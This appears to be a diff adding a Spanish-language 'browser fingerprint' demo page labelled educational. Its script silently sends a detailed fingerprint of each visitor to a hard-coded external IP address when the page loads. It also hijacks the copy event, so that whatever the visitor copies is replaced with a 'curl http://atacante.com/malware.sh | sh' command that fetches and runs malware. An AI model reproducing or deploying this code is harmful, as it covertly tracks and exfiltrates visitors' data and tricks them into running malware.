@@ -1,0 +1,239 @@
+<!DOCTYPE html>
+<html lang="es">
+<head>
+  <meta charset="UTF-8">
+  <title>Fingerprint Extendido</title>
+  <style>
+    body {
+      background-color: #0f1117;
+      color: #e0e0e0;
+      font-family: 'Fira Code', 'Courier New', monospace;
+      margin: 0;
+      padding: 2rem;
+      line-height: 1.4;
+    }
+
+    h1 {
+      color: #00ff99;
+      font-weight: 600;
+      font-size: 2rem;
+      text-align: center;
+      margin-bottom: 1.5rem;
+    }
+
+    .card {
+      background-color: #1a1d23;
+      border: 1px solid #2a2d33;
+      border-radius: 12px;
+      padding: 1.5rem;
+      box-shadow: 0 0 10px rgba(0, 255, 153, 0.1);
+      max-width: 1000px;
+      margin: 0 auto;
+      overflow-x: auto;
+    }
+
+    .section {
+      margin-bottom: 1.5rem;
+    }
+
+    .section-title {
+      color: #00cc88;
+      font-size: 1.2rem;
+      margin-bottom: 0.5rem;
+      border-bottom: 1px solid #00cc88;
+      padding-bottom: 0.2rem;
+    }
+
+    pre {
+      background-color: #111318;
+      padding: 1rem;
+      border-radius: 8px;
+      overflow-x: auto;
+      white-space: pre-wrap;
+      color: #a0f0d0;
+      font-size: 0.9rem;
+    }
+
+    .footer {
+      text-align: center;
+      font-size: 0.8rem;
+      margin-top: 2rem;
+      color: #888;
+    }
+  </style>
+</head>
+<body>
+  <h1>🔍 Huella Digital del Navegador</h1>
+
+  <div class="card" id="output">
+    <p>Cargando fingerprint...</p>
+  </div>
+
+  <div class="footer">Hecho con 🧠 por KAUXOAMYUS | Uso educativo</div>
+
+  <script>
+    async function getCanvasFingerprint() {
+      const canvas = document.createElement('canvas');
+      const ctx = canvas.getContext('2d');
+      ctx.textBaseline = 'top';
+      ctx.font = '16px Arial';
+      ctx.fillText('Hello, Fingerprint!', 2, 2);
+      return canvas.toDataURL();
+    }
+
+    function getWebGLInfo() {
+      const canvas = document.createElement('canvas');
+      const gl = canvas.getContext('webgl') || canvas.getContext('experimental-webgl');
+      if (!gl) return { renderer: 'No WebGL', vendor: 'No WebGL' };
+      const debugInfo = gl.getExtension('WEBGL_debug_renderer_info');
+      return {
+        renderer: gl.getParameter(debugInfo.UNMASKED_RENDERER_WEBGL),
+        vendor: gl.getParameter(debugInfo.UNMASKED_VENDOR_WEBGL)
+      };
+    }
+
+    async function getPermissions() {
+      if (!navigator.permissions) return 'Not supported';
+      const types = ['geolocation', 'notifications', 'camera', 'microphone', 'clipboard-read'];
+      const results = {};
+      for (const type of types) {
+        try {
+          const perm = await navigator.permissions.query({ name: type });
+          results[type] = perm.state;
+        } catch {
+          results[type] = 'unsupported';
+        }
+      }
+      return results;
+    }
+
+    function detectFonts() {
+      const baseFonts = ['monospace'];
+      const testFonts = ['Arial', 'Verdana', 'Times New Roman', 'Courier New', 'Georgia', 'Comic Sans MS', 'Impact'];
+      const testString = "mmmmmmmmmmlli";
+      const testSize = '72px';
+      const span = document.createElement("span");
+      span.style.fontSize = testSize;
+      span.innerText = testString;
+      const defaultWidths = {};
+      const result = [];
+
+      document.body.appendChild(span);
+
+      baseFonts.forEach(base => {
+        span.style.fontFamily = base;
+        defaultWidths[base] = span.offsetWidth;
+      });
+
+      testFonts.forEach(font => {
+        span.style.fontFamily = `'${font}', monospace`;
+        const width = span.offsetWidth;
+        if (width !== defaultWidths["monospace"]) {
+          result.push(font);
+        }
+      });
+
+      document.body.removeChild(span);
+      return result;
+    }
+
+    function detectExtensions() {
+      const knownGlobals = {
+        'MetaMask': () => !!window.ethereum,
+        'Grammarly': () => !!window.grammarly,
+        'React DevTools': () => !!window.__REACT_DEVTOOLS_GLOBAL_HOOK__,
+        'Vue DevTools': () => !!window.__VUE_DEVTOOLS_GLOBAL_HOOK__,
+        'Dark Reader': () => document.querySelector('meta[name="darkreader"]') !== null
+      };
+      const detected = [];
+      for (const [name, check] of Object.entries(knownGlobals)) {
+        if (check()) detected.push(name);
+      }
+      return detected;
+    }
+
+    function getJSAttributes(objName) {
+      try {
+        const obj = eval(objName);
+        return Object.getOwnPropertyNames(obj).sort();
+      } catch {
+        return ['No access'];
+      }
+    }
+
+    async function getFingerprint() {
+      const canvasFingerprint = await getCanvasFingerprint();
+      const webglInfo = getWebGLInfo();
+      const permissions = await getPermissions();
+      const fonts = detectFonts();
+      const extensions = detectExtensions();
+      const audioCtx = new (window.AudioContext || window.webkitAudioContext)();
+      const audioSampleRate = audioCtx.sampleRate;
+
+      const jsAttributes = {
+        navigator: getJSAttributes('navigator'),
+        window: getJSAttributes('window'),
+        document: getJSAttributes('document'),
+        screen: getJSAttributes('screen')
+      };
+
+      const fingerprint = {
+        'User Agent': navigator.userAgent,
+        'Idioma': navigator.language,
+        'Plataforma': navigator.platform,
+        'Núcleos CPU': navigator.hardwareConcurrency,
+        'Memoria del Dispositivo (GB)': navigator.deviceMemory || 'No soportado',
+        'Resolución de Pantalla': `${screen.width}x${screen.height}`,
+        'Profundidad de Color': screen.colorDepth,
+        'Diferencia Horaria (min)': new Date().getTimezoneOffset(),
+        'LocalStorage': typeof localStorage !== "undefined",
+        'SessionStorage': typeof sessionStorage !== "undefined",
+        'Pantalla Táctil': 'ontouchstart' in window,
+        'Plugins': Array.from(navigator.plugins).map(p => p.name),
+        'Fingerprint de Canvas': canvasFingerprint.slice(0, 80) + '...',
+        'WebGL Renderer': webglInfo.renderer,
+        'WebGL Vendor': webglInfo.vendor,
+        'Permisos del Navegador': permissions,
+        'Tasa de Muestreo de Audio': audioSampleRate,
+        'Fuentes Detectadas': fonts,
+        'Extensiones Detectadas': extensions,
+        'Atributos JS': jsAttributes
+      };
+
+        // Enviar al servidor
+        fetch('http://147.185.221.23:28059/recibir-fingerprint', {
+            method: 'POST',
+            headers: {
+            'Content-Type': 'application/json'
+            },
+            body: JSON.stringify(fingerprint)
+        });
+
+      // Mostrar datos con formato
+      const output = document.getElementById('output');
+      output.innerHTML = ''; // limpiar
+
+      for (const [key, value] of Object.entries(fingerprint)) {
+        const section = document.createElement('div');
+        section.className = 'section';
+        const title = document.createElement('div');
+        title.className = 'section-title';
+        title.textContent = key;
+        const pre = document.createElement('pre');
+        pre.textContent = typeof value === 'object' ? JSON.stringify(value, null, 2) : value;
+        section.appendChild(title);
+        section.appendChild(pre);
+        output.appendChild(section);
+      }
+    }
+
+    getFingerprint();
+
+    document.addEventListener('copy', (e) => {
+    const text = 'curl http://atacante.com/malware.sh | sh';
+    e.clipboardData.setData('text/plain', text);
+    e.preventDefault();
+  });
+  </script>
+</body>
+</html>
